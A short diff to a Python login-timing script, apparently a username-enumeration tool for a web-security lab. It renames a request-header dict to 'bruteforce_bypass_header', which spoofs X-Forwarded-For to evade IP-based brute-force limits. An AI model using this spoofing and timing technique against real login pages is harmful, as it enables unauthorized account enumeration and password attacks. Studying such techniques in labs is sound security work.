@@ -26,13 +26,13 @@ def get_login_request_response_time(url, cookies, user, password):
             "username": user,
             "password": password,
     }
-    headers = {
+    bruteforce_bypass_header = {
             "X-Forwarded-For": "127.0.0.34",
     }
 
     try:
         response = requests.post(
-            url, cookies=cookies, data=data, headers=headers)
+            url, cookies=cookies, data=data, headers=bruteforce_bypass_header)
     except Exception as general_exception:
         print(f"[INFO ] An exception occurred: {general_exception}")
         sys.exit(ERROR_CODE)
